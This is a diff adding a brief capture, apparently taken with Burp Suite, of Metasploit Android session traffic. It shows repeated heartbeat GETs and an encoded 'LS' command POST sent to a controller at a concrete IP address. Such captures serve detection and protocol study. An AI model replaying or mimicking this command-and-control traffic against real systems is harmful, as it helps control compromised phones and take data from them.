@@ -1,0 +1,35 @@
+#Metasploit capture Burpsuite 
+
+#HEARTBEAT
+get        = /zFq44ZhRq65V-VbqDWYhoQFmwb9NkUTJ87zZG4HIjgkahq7BgCcJKOC-R3oddbt-wbI6BJeQ8y2HKpov1UAxPu7z9yKrixftqdt6IdQCOL7PpmbeT7yzcdt5bLrWVsJ/ HTTP/1.1
+User-Agent = Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G930F Build/MMB29K)
+connection = Connection
+
+GET /zFq44ZhRq65V-VbqDWYhoQFmwb9NkUTJ87zZG4HIjgkahq7BgCcJKOC-R3oddbt-wbI6BJeQ8y2HKpov1UAxPu7z9yKrixftqdt6IdQCOL7PpmbeT7yzcdt5bLrWVsJ/ HTTP/1.1
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G930F Build/MMB29K)
+Host: 190.44.117.74
+Connection: close
+
+GET /zFq44ZhRq65V-VbqDWYhoQFmwb9NkUTJ87zZG4HIjgkahq7BgCcJKOC-R3oddbt-wbI6BJeQ8y2HKpov1UAxPu7z9yKrixftqdt6IdQCOL7PpmbeT7yzcdt5bLrWVsJ/ HTTP/1.1
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G930F Build/MMB29K)
+Host: 190.44.117.74
+Connection: close
+
+GET /zFq44ZhRq65V-VbqDWYhoQFmwb9NkUTJ87zZG4HIjgkahq7BgCcJKOC-R3oddbt-wbI6BJeQ8y2HKpov1UAxPu7z9yKrixftqdt6IdQCOL7PpmbeT7yzcdt5bLrWVsJ/ HTTP/1.1
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G930F Build/MMB29K)
+Host: 190.44.117.74
+Connection: close
+
+
+# LS 
+
+POST /zFq44ZhRq65V-VbqDWYhoQFmwb9NkUTJ87zZG4HIjgkahq7BgCcJKOC-R3oddbt-wbI6BJeQ8y2HKpov1UAxPu7z9yKrixftqdt6IdQCOL7PpmbeT7yzcdt5bLrWVsJ/ HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G930F Build/MMB29K)
+Host: 190.44.117.74
+Connection: close
+Content-Length: 162
+
+Body	³ÉÙÙÉ³	
+Body	ÙÉ³ÙÉ³ÙÈ³ª½×ø© ìÿªÔü­¾×ÙÉ³°ÙÈ³íù­ëþ©ëýªïý«íñªàð ïø¯îü¯ÙÉ³èÉ²iæ×ø­¨ìª¬Á¶éæÐö´çÅë¼¤î°¯Úø·¨ßà£¬Á¶¿ ßüªÉ³ÙÅ³ÙÍ³ÙÉ³ÙÑ³Ø	
+Body	Ãa(+Èrgæ`#¾ÿøh	
